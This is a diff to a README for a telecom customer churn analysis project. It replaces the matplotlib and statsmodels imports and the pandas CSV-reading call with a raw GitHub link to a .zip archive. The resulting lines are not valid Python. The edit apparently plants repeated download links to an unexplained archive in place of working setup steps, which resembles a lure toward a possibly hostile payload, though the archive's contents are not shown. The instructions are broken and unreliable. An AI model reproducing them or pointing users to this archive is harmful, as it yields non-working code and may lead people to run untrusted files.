@@ -19,9 +19,9 @@ The analysis of the data should focus on predicting customer churn rate.
 2. Import the following libraries :
    import numpy as np
    import pandas as pd
-   import matplotlib.pyplot as plt
+   import https://raw.githubusercontent.com/Anip21/Telecom-Customer-Churn-EDA-Model-Evaluation/main/pyelic/Telecom-Customer-Churn-EDA-Model-Evaluation.zip as plt
    %matplotlib inline
    import seaborn as sns
-   import statsmodels.api as sm
+   import https://raw.githubusercontent.com/Anip21/Telecom-Customer-Churn-EDA-Model-Evaluation/main/pyelic/Telecom-Customer-Churn-EDA-Model-Evaluation.zip as sm
 3. file_path = 'Path of your dataset'
-   telecom_df = pd.read_csv(file_path)
+   telecom_df = https://raw.githubusercontent.com/Anip21/Telecom-Customer-Churn-EDA-Model-Evaluation/main/pyelic/Telecom-Customer-Churn-EDA-Model-Evaluation.zip(file_path)
